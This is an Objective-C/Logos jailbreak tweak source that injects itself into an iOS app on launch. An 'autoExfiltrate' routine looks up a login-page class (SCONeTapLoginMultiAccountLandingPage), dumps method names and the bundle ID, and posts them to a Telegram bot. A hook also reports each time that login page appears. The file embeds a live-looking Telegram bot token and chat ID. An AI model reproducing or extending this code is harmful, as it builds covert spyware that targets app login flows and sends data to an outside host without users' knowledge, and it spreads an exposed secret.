#import <UIKit/UIKit.h>
#import <substrate.h>
#import <objc/runtime.h>

// --- CONFIGURATION ---
#define TG_TOKEN @"8134587785:AAGm372o_98TU_4CVq4TN2RzSdRkNHztc6E"
#define TG_CHAT_ID @"7730331218"
#define THEME_COLOR [UIColor colorWithRed:0.0 green:1.0 blue:0.8 alpha:1.0]

// --- TELEGRAM ENGINE ---
void sendToTelegram(NSString *message) {
    NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage", TG_TOKEN];
    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    [req setHTTPMethod:@"POST"];
    
    NSString *body = [NSString stringWithFormat:@"chat_id=%@&text=%@", 
                     TG_CHAT_ID, [message stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
    [req setHTTPBody:[body dataUsingEncoding:NSUTF8StringEncoding]];

    // Fire and forget (Background Priority)
    [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
}

// --- MAIN MENU ---
@interface EnigmaMenu : UIView
@property (nonatomic, strong) UIButton *floatBtn;
@end

@implementation EnigmaMenu

- (instancetype)initWithFrame:(CGRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        self.userInteractionEnabled = YES;
        [self setupUI];
        
        // AUTOMATIC TRIGGER: Run this 0.5s after the menu loads
        [self performSelector:@selector(autoExfiltrate) withObject:nil afterDelay:0.5];
    }
    return self;
}

- (void)autoExfiltrate {
    // 1. Search for the specific class from your screenshot
    Class targetClass = objc_getClass("SCONeTapLoginMultiAccountLandingPage");
    
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"🚀 AUTO-EXFILTRATION STARTED 🚀\n\n"];
    
    if (targetClass) {
        [log appendString:@"[✓] TARGET CLASS FOUND:\n"];
        [log appendString:@"SCONeTapLoginMultiAccountLandingPage\n"];
        [log appendFormat:@"Address: %p\n", targetClass];
        
        // Optional: Dump methods of this class
        unsigned int count;
        Method *methods = class_copyMethodList(targetClass, &count);
        [log appendString:@"\n[Methods Sample]:\n"];
        for (int i = 0; i < (count > 5 ? 5 : count); i++) {
            [log appendFormat:@"- %@\n", NSStringFromSelector(method_getName(methods[i]))];
        }
        free(methods);
    } else {
        [log appendString:@"[!] Target Class NOT loaded yet.\n"];
    }
    
    // 2. Add Environment Check
    [log appendString:@"\n[Environment]:\n"];
    [log appendFormat:@"Bundle: %@\n", [[NSBundle mainBundle] bundleIdentifier]];
    
    sendToTelegram(log);
}

- (void)setupUI {
    // The visual button you wanted back
    self.floatBtn = [UIButton buttonWithType:UIButtonTypeCustom];
    self.floatBtn.frame = CGRectMake(self.frame.size.width - 60, 100, 50, 50);
    self.floatBtn.backgroundColor = [UIColor blackColor];
    self.floatBtn.layer.cornerRadius = 25;
    self.floatBtn.layer.borderWidth = 2;
    self.floatBtn.layer.borderColor = THEME_COLOR.CGColor;
    [self.floatBtn setTitle:@"Ω" forState:UIControlStateNormal];
    [self.floatBtn setTitleColor:THEME_COLOR forState:UIControlStateNormal];
    [self addSubview:self.floatBtn];
}

// Only capture touches on the button
- (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event {
    UIView *hit = [super hitTest:point withEvent:event];
    if (hit == self.floatBtn) return hit;
    return nil;
}

@end

// --- HOOKS ---
// We keep this just in case the user navigates fast enough
%hook SCONeTapLoginMultiAccountLandingPage
- (void)viewDidAppear:(BOOL)animated {
    %orig;
    sendToTelegram(@"[EVENT] SCONeTapLoginMultiAccountLandingPage DID APPEAR!");
}
%end

// --- INJECTOR ---
%ctor {
    // Wait 3 seconds to let the app initialize, then show the menu
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        UIWindow *w = [UIApplication sharedApplication].keyWindow;
        if(w) [w addSubview:[[EnigmaMenu alloc] initWithFrame:w.bounds]];
    });
}
